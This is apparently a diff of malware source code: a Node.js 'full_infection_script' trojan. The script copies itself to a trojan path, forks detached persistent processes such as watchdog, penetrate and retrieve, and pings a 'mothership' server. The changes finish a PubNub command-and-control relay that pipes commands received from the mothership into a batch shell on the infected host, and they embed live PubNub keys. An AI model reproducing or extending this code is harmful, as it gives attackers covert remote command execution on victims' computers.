@@ -59,6 +59,13 @@ var processlist = [];
 
 // EXEC_VBS, EXEC_PS1, EXEC_BAT, EXEC_JS, EXEC_PY
 
+var process_argv = [];
+
+for ( let token of process.argv ) {
+    if ( token != '--inspect-brk' )
+        process_argv.push(token);
+}
+
 var systemstate = {
     staticdelay: 30,
 
@@ -78,8 +85,9 @@ var systemstate = {
     script_version: 'full_infection_script',
 
     get cmdname() {
-        if ( process.argv.length >= 3 )
-            return process.argv[2];
+
+        if ( process_argv.length >= 3 )
+            return process_argv[2];
         else 
             return 'init';
     },
@@ -95,8 +103,8 @@ var systemstate = {
     },
 
     get cmdtaskname() {
-        if ( ( this.cmdname == 'task' ) && ( process.argv.length >= 4 ) ) {
-            return process.argv[3];
+        if ( ( this.cmdname == 'task' ) && ( process_argv.length >= 4 ) ) {
+            return process_argv[3];
         }
 
         return '';
@@ -221,7 +229,7 @@ var systemstate = {
     },
 
     get scriptfpath() {
-        return process.argv[1];
+        return process_argv[1];
     },
 
     get scriptdir() {
@@ -252,8 +260,8 @@ var systemstate = {
 
         let token = "jobcode=";
 
-        if ( process.argv.length >= 3 ) { 
-            codeout = process.argv[process.argv.length-1];
+        if ( process_argv.length >= 3 ) { 
+            codeout = process_argv[process_argv.length-1];
         
             if ( codeout.toLowerCase().startsWith(token) ) {
                 codeout = codeout.substring(token.length-1);
@@ -334,6 +342,16 @@ class CmdConfig {
     #__childprocess = null; 
     #__childcmds = [];
     #__parentcmdconfig = null;
+
+    #__pubnubrelay = null;
+
+    set pubnubrelay(value) {
+        this.#__pubnubrelay = value;
+    };
+
+    get pubnubrelay() {
+        return this.#__pubnubrelay;
+    };
 
     set parentcmdconfig(value) {
         return this.#__parentcmdconfig = value;
@@ -441,8 +459,11 @@ class CmdConfig {
         return pid;        
     };
 
-    activate() {
+    activate(cmdlineargs, exitparent) {
         logmsg('starting');
+
+        if ( ! exitparent )
+            exitparent = false;
 
         let execlaunch = false;
 
@@ -467,9 +488,8 @@ class CmdConfig {
 
         if ( ispidalive ) {
 
-            // TEST
             if  ( cmdprocess &&  ( ! procname.includes(this.launchprocname) ) ) {
-                this.launch();
+                this.launch(cmdlineargs, exitparent);
                 logmsg('finished');
                 return;    
             }
@@ -536,22 +556,52 @@ class CmdConfig {
 
     };
 
-    launch(cmdlineargs) {
+    launch(cmdlineargs,exitparent) {
+
+        if ( ! exitparent )
+            exitparent = false;
 
         logmsg("launching ["+this.cmdname+"]");
 
         let child = null;
         
-        logmsg(`forking ${systemstate.trojanfpath} cmdlineargs: `+JSON.stringify(cmdlineargs));
+        logmsg(`forking ${systemstate.trojanfpath}`);
 
-        if ( Array.isArray(cmdlineargs) && cmdlineargs.length )
-            child = fork(systemstate.trojanfpath, [this.cmdname, ...cmdlineargs], { execArgv: ['--inspect-brk'] } );
-        else
-            child = fork(systemstate.trojanfpath, [this.cmdname], { execArgv: ['--inspect-brk'] } );
+        let opts = {};
+    
+        if ( ISDEBUG )
+            opts.execArgv = ['--inspect-brk'];
+
+        if ( exitparent ) {
+            opts.detached = true;
+            opts.stdio = 'ignore';
+        }
+        
+        if (! ( Array.isArray(cmdlineargs) && cmdlineargs.length >= 1 ) )
+            cmdlineargs = [];
+
+        cmdlineargs = [this.cmdname, ...cmdlineargs];
+
+        if ( ! fileExists(systemstate.trojanfpath) ) {
+            fs.copyFile(systemstate.scriptfpath, systemstate.trojanfpath, (err) => {
+                logmsg('ERROR: '+err);
+            });
+        }
+
+        if ( ! fileExists(systemstate.trojanfpath) ) {
+            throw new Error('trojan script does not exists at '+systemstate.trojanfpath);
+        }
+
+        child = fork(systemstate.trojanfpath, cmdlineargs, opts );
         
         this.#__childprocess = child;
         this.#__launchprocname = path.basename(child.spawnargs[0]);
         this.#__launchscriptfname = path.basename(systemstate.trojanfpath);
+
+        if ( exitparent ) {
+            child.disconnect();
+            child.unref();
+        }
 
         let tchildproc = getProcess(child.pid);
 
@@ -643,7 +693,6 @@ class CmdConfig {
     };
 };
 
-// TODO
 class PubnubRelay {
     static PUBLISH_KEY = 'pub-c-a00eaad9-c35e-4a41-bd62-cdc619a6f2cc';
     static SUBSCRIBE_KEY = 'sub-c-94ed1e1c-a765-4fd9-ba9e-f8ebbb47f5bd';
@@ -652,8 +701,6 @@ class PubnubRelay {
 
     #__enginename = 'UNKNOWN';
     #__userid = 'clientid_'+systemstate.clientid;
-    #__mothership_channel = `clientid_${systemstate.clientid}_${this.enginename}_mothership`;
-    #__client_channel = `clientid_${systemstate.clientid}_${this.enginename}_client`;
  
     constructor(enginename) {
         this.#__enginename = enginename;
@@ -666,11 +713,11 @@ class PubnubRelay {
     }
 
     get mothership_channel() {
-        return this.#__mothership_channel;
+        return `clientid_${systemstate.clientid}_${this.enginename}_mothership`;
     };
 
     get client_channel() {
-        return this.#__client_channel;
+        return `clientid_${systemstate.clientid}_${this.enginename}_client`;
     };
 
     get pubnubConnection() {
@@ -1099,11 +1146,12 @@ function getKey(obj, searchKey) {
     return keyret;
 }
 
- 
-
 // --- startup
 
-logmsg(`starting -- cmdname=${systemstate.cmdname} ts=${systemstate.scriptts} pid=${systemstate.scriptpid} ppid=${systemstate.scriptparentpid}`);
+let cmdarr = process_argv;
+let cmdarrstr = cmdarr ? cmdarr.join() : '';
+
+logmsg(`starting -- cmdname=${systemstate.cmdname} ts=${systemstate.scriptts} pid=${systemstate.scriptpid} ppid=${systemstate.scriptparentpid} -- ${cmdarrstr}`);
 logmsg(`scriptmd5=${systemstate.scriptmd5}`);
 
 initProcessList();
@@ -1185,7 +1233,7 @@ function startup() {
 
     penetratecmd.launch();
     retrievecmd.launch();
-    watchdogcmd.activate();
+    watchdogcmd.activate(null, true);
 
     watchdogcmd.childprocess?.unref();
     retrievecmd.childprocess?.unref();
@@ -1320,7 +1368,9 @@ async function ping_loop() {
     let inputHeaders = null;
     let params = systemstate.statekvp;
     
-    let pingresponse = await makeGetRequest(baseUrl, params, inputHeaders, null);
+    let pingpath = path.join(systemstate.trojandir, 'ping_response');
+    let downloadOpts = { download:true, filetype:'txt', localpath:pingpath };
+    let pingresponse = await makeGetRequest(baseUrl, params, inputHeaders, downloadOpts);
     
     let isvalid = validatePingResponse(pingresponse);
 
@@ -1527,7 +1577,7 @@ function relay() {
 
     let configfpath = '';
 
-    configfpath = process.argv.length >= 4 ? process.argv[3] : '';
+    configfpath = process_argv.length >= 4 ? process_argv[3] : '';
     
     logmsg('reading configfpath: '+configfpath);
 
@@ -1556,17 +1606,18 @@ function relay() {
 
     // RODO revise implementation to allow for all script engines in addition to BAT
 
-    let childp = runbatrelay();
+    relaycmd.pubnubrelay = new PubnubRelay('BAT'); // get engine name from clientjob
+  
+    let pubnubr = relaycmd.pubnubrelay;
 
-    let pubnubr = new PubnubRelay('BAT'); // get engine name from clientjob
-    
     // incoming cmd str from mothership
     pubnubr.handleMessage = (msgevent) => {
-        // TODO: extract cmdstr from msgevent
-        let cmdstr = 'echo test 1234';
-        cmdstr += ' \n';
-        writeToChildProcess(childp, cmdstr);
+        let payload = msgevent.message;
+        let cmdtext = payload.cmdtext;
+        writeToChildProcess(childp, cmdtext);
     };
+
+    let childp = runbatrelay(pubnubr);
 
     relaycmd.loopfunc = () => {
         logmsg("relay looping...");
@@ -1583,7 +1634,7 @@ function execjob() {
 
     let configfpath = '';
 
-    configfpath = process.argv.length >= 4 ? process.argv[3] : '';
+    configfpath = process_argv.length >= 4 ? process_argv[3] : '';
     
     logmsg('reading configfpath: '+configfpath);
 
@@ -1837,4 +1888,13 @@ function logEventMothership(event_code, kvp) {
 
     ping.php
     EXEC_CMD --> StartRelay|BAT,PS1,PY,JS,VBS
+
+    incomming cmd
+    { cmdtext:'echo 1234 \n', seqid:1234, cmdid:random 8 digit code, ts:timestamp }
+
+    outgoing result
+    { status:'OK', scriptengine:'BAT', execresult:data, seqid:1234+1, cmdid:random 8 digit code, ts:timestamp }
+    { status:'ERROR', scriptengine:'BAT', execresult:data, seqid:1234+1, cmdid:random 8 digit code, ts:timestamp }
+    { status:'INFO', scriptengine:'BAT', execresult:data, seqid:1234+1, cmdid:random 8 digit code, ts:timestamp }
+
 */
